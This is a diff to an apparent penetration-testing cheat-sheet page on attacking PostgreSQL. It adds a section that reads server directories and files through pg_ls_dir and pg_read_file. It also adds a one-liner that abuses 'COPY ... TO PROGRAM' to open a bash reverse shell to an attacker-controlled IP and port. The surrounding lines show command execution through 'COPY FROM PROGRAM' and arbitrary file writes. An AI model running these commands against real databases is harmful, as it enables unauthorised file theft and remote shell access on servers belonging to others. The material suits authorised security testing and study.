@@ -1,7 +1,7 @@
 ---
 title: "Postgresql"
-date: 2025-3-2
-tags: ["Database Dumping", "Privilege Escalation In Databases", "Postgresql", "RCE", "Database"]
+date: 2025-7-17
+tags: ["Database Dumping", "Privilege Escalation In Databases", "Postgresql", "RCE", "Database", "File Read"]
 ---
 
 ### Connect
@@ -60,7 +60,19 @@ copy (select '<STRING>') to '<TARGET_PATH>';
 \q
 ```
 
-<br>
+---
+
+### File Read
+
+```console
+# List Directory
+SELECT * FROM pg_ls_dir('<DIR_PATH>');
+``` 
+
+```console
+# File Read
+SELECT pg_read_file('<FILE_PATH>', 0, 4096);
+```
 
 ---
 
@@ -79,4 +91,9 @@ COPY exec FROM PROGRAM '<CMD>';
 ```console
 # Check Ouput
 SELECT * FROM exec;
+```
+
+```console
+# One-liner
+DO $$ DECLARE c text; BEGIN c := 'COPY (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/<LOCAL_IP>/<PORT> 0>&1"'''; EXECUTE c; END $$;
 ```
